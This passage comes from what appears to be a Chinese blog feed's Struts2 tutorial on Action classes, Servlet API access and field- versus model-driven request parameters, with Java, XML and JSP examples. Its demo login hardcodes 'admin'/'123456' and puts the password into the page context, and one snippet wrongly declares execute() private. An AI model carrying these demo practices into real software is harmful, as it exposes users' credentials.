class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionContext;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username; <span class="comment">// 用户名</span></span><br><span class="line">    <span class="keyword">private</span> String password; <span class="comment">// 密码</span></span><br><span class="line">    <span class="comment">// username的getter和setter方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// password的getter和setter方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获取ActionContext对象</span></span><br><span class="line">        ActionContext context = ActionContext.getContext();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"admin"</span>.equals(username) &amp;&amp; <span class="string">"123456"</span>.equals(password)) &#123;</span><br><span class="line">            <span class="comment">// 将用户名和密码信息放入context对象中</span></span><br><span class="line">            context.put(<span class="string">"username"</span>, username);</span><br><span class="line">            context.put(<span class="string">"password"</span>, password);</span><br><span class="line">            context.put(<span class="string">"success"</span>, <span class="string">"用户登录成功！"</span>);</span><br><span class="line">            <span class="keyword">return</span> SUCCESS;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 定义登录失败的错误信息</span></span><br><span class="line">            context.put(<span class="string">"error"</span>, <span class="string">"用户名或密码错误，请重新登录！"</span>);</span><br><span class="line">            <span class="keyword">return</span> ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改struts.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定 Struts2 配置文件的 DTD 信息 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.3.dtd"&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Struts2配置文件的根元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Struts2的Action必须放在指定的包空间下定义 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"default"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.LoginAction"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>/error.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如图：</p><p><img src="/2020/05/01/Struts2基础篇之Action/1.png" alt=""></p><p><img src="/2020/05/01/Struts2基础篇之Action/2.png" alt=""></p><p><img src="/2020/05/01/Struts2基础篇之Action/3.png" alt=""></p><h3 id="通过ServletActionContext访问"><a href="#通过ServletActionContext访问" class="headerlink" title="通过ServletActionContext访问"></a>通过ServletActionContext访问</h3><p>除了通过 ActionContext 类访问 Servlet API 以外，Struts2 框架还提供了 ServletActionContext 类访问 Servlet API，该类中的方法都是静态方法，其常见方法如表所示。</p><table><thead><tr><th>方法声明</th><th>功能描述</th></tr></thead><tbody><tr><td>static PageContext getPageContext()</td><td>获取 Web 应用的 PageContext 对象</td></tr><tr><td>static HttpServletRequest getRequest()</td><td>获取 Web 应用的 HttpServletRequest 对象</td></tr><tr><td>static HttpServletResponse getResponse()</td><td>获取 Web 应用的 HttpServletResponse 对象</td></tr><tr><td>static ServletContext getServletContext()</td><td>获取 Web 应用的 ServletContext 对象</td></tr></tbody></table><h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><p>在前面项目中的 com.mi1k7ea 包下创建 MessageAction 类，编写后的代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.ServletActionContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MessageAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ServletActionContext.getRequest().setAttribute(<span class="string">"message"</span>,<span class="string">"Access Servlet API By ServletActionContext."</span>);</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在struts.xml的package标签内添加一个action标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.MessageAction"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>/message.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建message.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div align="center"&gt;$&#123;requestScope.message &#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>运行效果：</p><p><img src="/2020/05/01/Struts2基础篇之Action/4.png" alt=""></p><h2 id="0x03-Action处理请求参数"><a href="#0x03-Action处理请求参数" class="headerlink" title="0x03 Action处理请求参数"></a>0x03 Action处理请求参数</h2><p>在 Struts2 框架中，页面的请求数据和 Action 有两种基本的对应方式，分别是字段驱动（FieldDriven，也称为属性驱动）方式和模型驱动（ModelDriver）方式。</p><h3 id="属性驱动"><a href="#属性驱动" class="headerlink" title="属性驱动"></a>属性驱动</h3><p>属性驱动是指在 Action 中通过字段属性进行与页面之间的数据传递，通常使用时会包括两种情况：一种是与基本数据类型的属性对应，另一种是直接使用域对象。</p><h4 id="基本数据类型字段驱动方式的数据传递"><a href="#基本数据类型字段驱动方式的数据传递" class="headerlink" title="基本数据类型字段驱动方式的数据传递"></a>基本数据类型字段驱动方式的数据传递</h4><p>在 Struts2 中，可以直接在 Action 中定义各种 Java 基本数据类型的字段，使这些字段与表单数据相对应，并利用这些字段进行数据传递，如下面的代码所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username; <span class="comment">// 用户名</span></span><br><span class="line">    <span class="keyword">private</span> String password; <span class="comment">// 密码</span></span><br><span class="line">    <span class="comment">// 此处省略两个属性的getter和setter方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述 Action 类的代码中，定义了两个字符串字段 username 和 password，这两个字段分别用于对应页面上的用户名和密码这两个表单域。</p><h4 id="直接使用域对象字段驱动方式的数据传递"><a href="#直接使用域对象字段驱动方式的数据传递" class="headerlink" title="直接使用域对象字段驱动方式的数据传递"></a>直接使用域对象字段驱动方式的数据传递</h4><p>在基本数据类型字段驱动方式中，如果传入的数据很多，那么 Action 的属性也会变得很多，再加上属性对应的 getter/setter 方法，势必会导致 Action 非常臃肿。</p><p>为了解决这一问题，我们可以把属性的 getter/setter 方法从 Action 中提取出来单独作为一个域对象，并在相应的 Action 中直接使用这个域对象。此种方式中的域对象一般以 JavaBean 的形式实现，JavaBean 中所封装的属性要和页面中表单的属性一一对应。此时 JavaBean 将成为数据传递的载体，并可以在其他 Action 中使用。</p><p>Demo参考：<a href="http://c.biancheng.net/view/4095.html" target="_blank" rel="noopener">http://c.biancheng.net/view/4095.html</a></p><h2 id="模型驱动"><a href="#模型驱动" class="headerlink" title="模型驱动"></a>模型驱动</h2><p>在 Struts2 中，Action 还有另外一种方式处理请求参数，称为模型驱动（ModelDriven）。</p><p>模型驱动方式要求 Action 需要通过实现 ModelDriven 接口接收请求参数，并且要重写 getModel() 方法。getModel() 方法返回的就是 Action 所使用的数据模型对象。</p><p>与属性驱动中直接使用域对象字段驱动方式的数据传递类似，模型驱动方式也是通过 JavaBean 模型进行数据传递的。只要是普通的 JavaBean，就可以充当模型部分，并且 JavaBean 中所封装的属性要与表单的属性一一对应，JavaBean 就是数据传递的载体。</p><p>使用模型驱动方式时，Action 类中通过 getModel() 方法获取模型，其示例代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"><span class="keyword">import</span> com.mi1k7ea.User;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ModelDriven;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> <span class="keyword">implements</span> <span class="title">ModelDriven</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> User user = <span class="keyword">new</span> User();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getModel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用模型驱动时，其对应的表单页面也要做相应调整，调整后的代码片段如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"loginAction"</span> method=<span class="string">"post"</span> name=<span class="string">"form1"</span>&gt;</span><br><span class="line">    用户名：&lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>/&gt;&lt;br/&gt;</span><br><span class="line">    密码：&lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>/&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"登录"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，使用 ModelDriver 的方式后，表单中的文本域名称已经不需要添加 user 前缀，页面上的 username 会自动对应到这个 Model 的 username 属性。</p><p>与属性驱动相比，模型驱动不需要在 Action 类中定义与表单元素一一对应的所有属性及其各属性的 getter 和 setter 方法，这减少了 Action 类中的代码量。在项目应用中具体使用哪种驱动方法，现给出以下几点建议。</p><ol><li>要统一整个系统中 Action 的驱动方法，即要么都使用属性驱动，要么都使用模型驱动。</li><li>如果持久层对象与表单中的属性是一一对应的关系，那么建议使用模型驱动，因为模型驱动方法使 Action 类中的代码更加整洁。</li><li>如果持久层对象与表单中的属性不是一一对应的关系，那么建议使用属性驱动，因为不是一一对应的关系时，系统中需要提供两个 JavaBean（一个对应表单提交的数据，一个用于持久层对象）。</li></ol><p>总之，属性驱动的方法和模型驱动的方法各有优缺点，在实际开发中，需要根据项目实际情况选择使用哪种驱动方式。  </p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/categories/Java/Struts2/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/tags/Struts2/"/>
    
  </entry>
  
</feed>
